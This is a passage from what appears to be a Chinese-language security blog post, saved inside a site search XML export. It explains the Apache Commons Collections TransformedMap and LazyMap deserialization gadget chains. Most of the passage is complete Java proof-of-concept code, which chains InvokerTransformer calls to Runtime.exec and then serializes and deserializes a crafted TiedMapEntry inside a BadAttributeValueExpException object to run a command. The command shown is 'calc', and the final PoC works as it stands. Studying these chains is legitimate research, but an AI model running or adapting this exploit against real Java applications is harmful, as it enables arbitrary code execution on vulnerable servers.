args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br><br>        &#125;;<br>        Transformer transformerChain=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>);<br>        Map transformedmap= TransformedMap.decorate(map,<span class="hljs-literal">null</span>,transformerChain);<br>        Class  clazz=Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor cons=clazz.getDeclaredConstructor(Class.class,Map.class);<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        Object  ins=cons.newInstance(java.lang.annotation.Retention.class,transformedmap);<br>        ByteArrayOutputStream exp=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>        oos.writeObject(ins);<br>        oos.flush();<br>        oos.close();<br>        ByteArrayInputStream out=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(out);<br>        Object obj=(Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>首先还是先找到调用transform方法：<br>org.apache.commons.collections.map.LazyMap::get</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc34.png" class="" title="pc34"><p>寻找this.factory是否可控：</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc35.png" class="" title="pc35"><p>返回了一个Transformer类型的对象</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc36.png" class="" title="pc36"><p>因为org.apache.commons.collections.map.LazyMap::get 是public方法，可以直接调用，不过需要一个LazyMap的对象：<br>直接调用静态方法就可以获取到LazyMap对象</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc37.png" class="" title="pc37"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilTest2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        org.apache.commons.collections.Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">//获取到Runtime.getRuntime方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-comment">//反射调用getRuntime，获取到Runtime类</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-comment">//反射调用exec方法</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lm</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        lm.get(<span class="hljs-string">&quot;666&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是要找到谁调用了get方法<br>因为暂未找到在readObject方法中调用get的类，所以跟踪get方法的调用栈，看哪些方法调用了get，并且他们有可能在readObject中被调用TiedMapEntry.getValue()</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc38.png" class="" title="pc38"><p>TiedMapEntry.getValue调用了get方法， this.key也由构造方法中传入, 我们让this.map指向LazyMap对象即可</p><p>谁调用了getValue()呢：TiedMapEntry.toString()</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc39.png" class="" title="pc39"><p>这个类的toString()方法中调用了getValue，我们只要将this指向TiedMapEntry即可 </p><p>现在就要找哪里有readObject:<br>javax.management.BadAttributeValueExpException.readObject()<br>javax.management.BadAttributeValueExpException类的readObject方法调用了toString()</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc40.png" class="" title="pc40"><p>我们要valObj指向 TiedMapEntry就可以触发<br>现在就要逆推查看valObj怎么来</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc41.png" class="" title="pc41"><p>val是 BadAttributeValueExpException 私有属性：</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc42.png" class="" title="pc42"><p>因为我们想要控制的这个val是个私有属性<br>可以通过反射对私有属性赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-literal">null</span>);<br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<span class="hljs-comment">//创建实例对象</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> ins.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<span class="hljs-comment">//拿到BadAttributeValueExpException类的Field中的val属性</span><br>val.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置访问权限为true</span><br>val.set(ins,tiedMapEntry);<span class="hljs-comment">//修改ins实例对象中私有属性val的值为上面构建的TiedMapEntry</span><br></code></pre></td></tr></table></figure><p>最后的poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span>  org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span>  org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span>  org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span>  org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lazy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  NoSuchFieldException, IOException,  ClassNotFoundException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span>  <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span>  <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span>  <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;), <span class="hljs-keyword">new</span>  <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,  Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),  <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span>  <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span>  <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashedMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,  transformerChain);<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span>  <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span>  <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<span class="hljs-comment">//创建实例对象</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span>  ins.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<span class="hljs-comment">//拿到BadAttributeValueExpException类的Field中的val属性</span><br>        val.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置访问权限为true</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            val.set(ins,tiedMapEntry);<span class="hljs-comment">//修改ins实例对象中私有属性val的值为上面构建的TiedMapEntry</span><br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span>  <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span>  <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>        oos.writeObject(ins);<br>        oos.flush();<br>        oos.close();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span>  <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span>  <span class="hljs-title class_">ObjectInputStream</span>(out);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
